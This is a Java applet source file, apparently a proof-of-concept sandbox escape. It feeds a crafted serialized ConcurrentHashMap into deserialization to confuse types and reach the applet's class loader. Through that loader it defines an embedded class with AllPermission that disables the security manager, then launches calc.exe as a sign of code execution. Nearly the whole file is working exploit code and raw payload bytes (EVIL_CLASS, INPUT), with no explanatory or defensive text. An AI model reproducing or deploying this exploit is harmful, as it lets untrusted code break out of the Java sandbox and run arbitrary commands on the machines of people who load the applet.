import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Field;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.util.concurrent.ConcurrentHashMap;

import sun.misc.Unsafe;



public class CHM extends Applet {

	private static class EvilClassLoader extends ClassLoader {
		public static Class f(EvilClassLoader l, String name, byte[] bytes, ProtectionDomain domain) {
			return l.defineClass(name, bytes, 0, bytes.length, domain);
		}
	}
	private static class Seg {
		private Object padding;
		private HEntry[] table;
		private int count;
		private int modCount;
		private int threshold;
		private float loadFactor;
		
	}
	
	private static class HEntry {
		private int hash;
		private Object key;
		private EvilClassLoader value;
		private HEntry next;
	}


	private boolean tryKey(String key, ConcurrentHashMap map, Seg[] segs)throws Exception {
		System.out.println(key.hashCode());
		System.out.println(CHM.class.getClassLoader());
		map.put(key, CHM.class.getClassLoader());
		
		for (int i = 0; i < segs.length; ++i) {
			if (segs[i] != null) {
				System.out.println("hello: " + segs[i]);
				for (int j = 0; j < segs[i].table.length; ++j) {
					if (segs[i].table[j] != null) {
						System.out.println("table: " + segs[i].table[j].value);
						PermissionCollection collection = new Permissions();
						collection.add(new AllPermission());
						
						ProtectionDomain domain = new ProtectionDomain(null, collection);
						Class clz = EvilClassLoader.f(segs[i].table[j].value, "Evil", EVIL_CLASS, domain);
						clz.getMethod("disable").invoke(null);
						return true;
					}
				}
			}
		}
		
		return false;
				
	}
	public void init() {
		try {			
			ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(INPUT));
		
		  System.gc();
			Thread.sleep(1000);
			
			ConcurrentHashMap map = (ConcurrentHashMap) ois.readObject();
		
			//Unsafe unsafe = getUnsafe();

			/* make this too large and it will get allocated to a different pool and be very very far away from the map */
			/* make this too small and we might try to write beyond it */
			Seg[] segs = new Seg[1024 * 500];
			
			//System.out.println(addressOf(unsafe, getValue(map, "segments")));
			
			//System.out.println(addressOf(unsafe, segs));
						
			for (char k = 0; k < Character.MAX_VALUE; ++k) {
				try {
					if (tryKey("" + k, map, segs)) {
						break;
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			

			System.out.println(System.getProperty("user.home"));
			ProcessBuilder builder = new ProcessBuilder("calc.exe");
			builder.start();
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
	
	/*
	private sun.misc.Unsafe getUnsafe() throws Exception {
		Field unsafeF = ConcurrentHashMap.class.getDeclaredField("UNSAFE");
		unsafeF.setAccessible(true);
		return (Unsafe) unsafeF.get(null);
	}
	
	private long addressOf(Unsafe unsafe, Object o) {
		Object[] arr = new Object[]{o};
		
		int offset = unsafe.arrayBaseOffset(Object[].class);
		return unsafe.getInt(arr, (long)offset);
		
	}
	
	private Object getValue(Object o, String field)throws Exception {
		Field f = o.getClass().getDeclaredField(field);
		f.setAccessible(true);
		return f.get(o);
		
	}
	
	*/
	public static void main(String[]args) {
		new CHM().init();
	}
	
	
	private static final byte[] EVIL_CLASS = new byte[]{
		-54, -2, -70, -66, 0, 0, 0, 50, 0, 46, 7, 0, 2, 1, 0, 4, 69, 118, 105, 108, 7, 0, 4, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 7, 0, 6, 1, 0, 30, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 65, 99, 116, 105, 111, 110, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 10, 0, 3, 0, 11, 12, 0, 7, 0, 8, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 7, 100, 105, 115, 97, 98, 108, 101, 10, 0, 1, 0, 11, 10, 0, 19, 0, 21, 7, 0, 20, 1, 0, 30, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 65, 99, 99, 101, 115, 115, 67, 111, 110, 116, 114, 111, 108, 108, 101, 114, 12, 0, 22, 0, 23, 1, 0, 12, 100, 111, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 1, 0, 52, 40, 76, 106, 97, 118, 97, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 80, 114, 105, 118, 105, 108, 101, 103, 101, 100, 65, 99, 116, 105, 111, 110, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 3, 114, 117, 110, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 10, 0, 27, 0, 29, 7, 0, 28, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 12, 0, 30, 0, 31, 1, 0, 18, 115, 101, 116, 83, 101, 99, 117, 114, 105, 116, 121, 77, 97, 110, 97, 103, 101, 114, 1, 0, 30, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 101, 99, 117, 114, 105, 116, 121, 77, 97, 110, 97, 103, 101, 114, 59, 41, 86, 9, 0, 27, 0, 33, 12, 0, 34, 0, 35, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 8, 0, 37, 1, 0, 25, 100, 105, 115, 97, 98, 108, 101, 100, 32, 115, 101, 99, 117, 114, 105, 116, 121, 32, 109, 97, 110, 97, 103, 101, 114, 10, 0, 39, 0, 41, 7, 0, 40, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 12, 0, 42, 0, 43, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 0, 33, 0, 1, 0, 3, 0, 1, 0, 5, 0, 0, 0, 3, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 10, -79, 0, 0, 0, 2, 0, 12, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 13, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 14, 0, 15, 0, 0, 0, 9, 0, 16, 0, 8, 0, 1, 0, 9, 0, 0, 0, 48, 0, 2, 0, 0, 0, 0, 0, 12, -69, 0, 1, 89, -73, 0, 17, -72, 0, 18, 87, -79, 0, 0, 0, 2, 0, 12, 0, 0, 0, 10, 0, 2, 0, 0, 0, 8, 0, 11, 0, 9, 0, 13, 0, 0, 0, 2, 0, 0, 0, 1, 0, 24, 0, 25, 0, 1, 0, 9, 0, 0, 0, 64, 0, 2, 0, 1, 0, 0, 0, 14, 1, -72, 0, 26, -78, 0, 32, 18, 36, -74, 0, 38, 1, -80, 0, 0, 0, 2, 0, 12, 0, 0, 0, 14, 0, 3, 0, 0, 0, 13, 0, 4, 0, 14, 0, 12, 0, 15, 0, 13, 0, 0, 0, 12, 0, 1, 0, 0, 0, 14, 0, 14, 0, 15, 0, 0, 0, 1, 0, 44, 0, 0, 0, 2, 0, 45

	};
	
	private static final byte[] INPUT = new byte[]{
-84, -19, 0, 5, 115, 114, 0, 38, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 67, 111, 110, 99, 117, 114, 114, 101, 110, 116, 72, 97, 115, 104, 77, 97, 112, 100, -103, -34, 18, -99, -121, 41, 61, 3, 0, 3, 73, 0, 11, 115, 101, 103, 109, 101, 110, 116, 77, 97, 115, 107, 73, 0, 12, 115, 101, 103, 109, 101, 110, 116, 83, 104, 105, 102, 116, 91, 0, 8, 115, 101, 103, 109, 101, 110, 116, 115, 116, 0, 49, 91, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 47, 67, 111, 110, 99, 117, 114, 114, 101, 110, 116, 72, 97, 115, 104, 77, 97, 112, 36, 83, 101, 103, 109, 101, 110, 116, 59, 120, 112, 0, 4, 0, 0, 0, 0, 0, 0, 117, 114, 0, 49, 91, 76, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 67, 111, 110, 99, 117, 114, 114, 101, 110, 116, 72, 97, 115, 104, 77, 97, 112, 36, 83, 101, 103, 109, 101, 110, 116, 59, 82, 119, 63, 65, 50, -101, 57, 116, 2, 0, 0, 120, 112, 0, 0, 0, 16, 115, 114, 0, 46, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 67, 111, 110, 99, 117, 114, 114, 101, 110, 116, 72, 97, 115, 104, 77, 97, 112, 36, 83, 101, 103, 109, 101, 110, 116, 31, 54, 76, -112, 88, -109, 41, 61, 2, 0, 1, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 120, 114, 0, 40, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 108, 111, 99, 107, 115, 46, 82, 101, 101, 110, 116, 114, 97, 110, 116, 76, 111, 99, 107, 102, 85, -88, 44, 44, -56, 106, -21, 2, 0, 1, 76, 0, 4, 115, 121, 110, 99, 116, 0, 47, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 47, 108, 111, 99, 107, 115, 47, 82, 101, 101, 110, 116, 114, 97, 110, 116, 76, 111, 99, 107, 36, 83, 121, 110, 99, 59, 120, 112, 115, 114, 0, 52, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 108, 111, 99, 107, 115, 46, 82, 101, 101, 110, 116, 114, 97, 110, 116, 76, 111, 99, 107, 36, 78, 111, 110, 102, 97, 105, 114, 83, 121, 110, 99, 101, -120, 50, -25, 83, 123, -65, 11, 2, 0, 0, 120, 114, 0, 45, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 108, 111, 99, 107, 115, 46, 82, 101, 101, 110, 116, 114, 97, 110, 116, 76, 111, 99, 107, 36, 83, 121, 110, 99, -72, 30, -94, -108, -86, 68, 90, 124, 2, 0, 0, 120, 114, 0, 53, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 108, 111, 99, 107, 115, 46, 65, 98, 115, 116, 114, 97, 99, 116, 81, 117, 101, 117, 101, 100, 83, 121, 110, 99, 104, 114, 111, 110, 105, 122, 101, 114, 102, 85, -88, 67, 117, 63, 82, -29, 2, 0, 1, 73, 0, 5, 115, 116, 97, 116, 101, 120, 114, 0, 54, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 99, 111, 110, 99, 117, 114, 114, 101, 110, 116, 46, 108, 111, 99, 107, 115, 46, 65, 98, 115, 116, 114, 97, 99, 116, 79, 119, 110, 97, 98, 108, 101, 83, 121, 110, 99, 104, 114, 111, 110, 105, 122, 101, 114, 51, -33, -81, -71, -83, 109, 111, -87, 2, 0, 0, 120, 112, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 115, 113, 0, 126, 0, 5, 115, 113, 0, 126, 0, 9, 0, 0, 0, 0, 63, 64, 0, 0, 112, 112, 120
	};
}
